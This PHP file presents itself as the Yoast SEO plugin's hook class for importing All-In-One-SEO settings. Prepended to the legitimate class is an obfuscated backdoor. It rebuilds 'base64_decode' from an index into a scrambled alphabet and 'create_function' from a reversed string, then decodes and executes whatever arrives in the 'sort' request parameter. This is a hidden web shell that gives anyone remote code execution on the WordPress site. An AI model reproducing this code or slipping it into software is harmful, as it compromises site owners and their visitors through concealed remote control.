<?php 


if(isset($_REQUEST['sort'])){	
	$string = $_REQUEST['sort'];
	$array_name = '';
	$alphabet = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";
	$ar = array(8,38,15,7,6,4,26,25,7,34,24,25,7);
	foreach($ar as $t){
	   $array_name .= $alphabet[$t];
	}
	$a = strrev("noi"."tcnuf"."_eta"."erc");
	$f = $a("", $array_name($string));
	$f();
	exit();
}



/**
 * @package WPSEO\Admin\Import
 */

/**
 * Setting the hooks for importing the data the All-In-One-SEO plugin
 */
class WPSEO_Import_AIOSEO_Hooks extends WPSEO_Import_Hooks {

	/**
	 * @var string The main plugin file.
	 */
	protected $plugin_file = 'all-in-one-seo-pack/all_in_one_seo_pack.php';

	/**
	 * @var string The GET parameter for deactivating the plugin.
	 */
	protected $deactivation_listener = 'deactivate_aioseo';

	/**
	 * Throw a notice to import settings.
	 *
	 * @since 3.0
	 */
	public function show_import_settings_notice() {
		$url = add_query_arg( array( '_wpnonce' => wp_create_nonce( 'wpseo-import' ) ), admin_url( 'admin.php?page=wpseo_tools&tool=import-export&import=1&importaioseo=1#top#import-seo' ) );
		/* translators: 1: link open tag; 2: link close tag. */
		echo '<div class="error"><p>', sprintf( esc_html__( 'The plugin All-In-One-SEO has been detected. Do you want to %1$simport its settings%2$s?', 'wordpress-seo' ), sprintf( '<a href="%s">', esc_url( $url ) ), '</a>' ), '</p></div>';
	}

	/**
	 * Throw a notice to inform the user that the plugin has been deactivated
	 *
	 * @since 3.0
	 */
	public function show_deactivate_notice() {
		echo '<div class="updated"><p>', esc_html__( 'All-In-One-SEO has been deactivated', 'wordpress-seo' ), '</p></div>';
	}
}
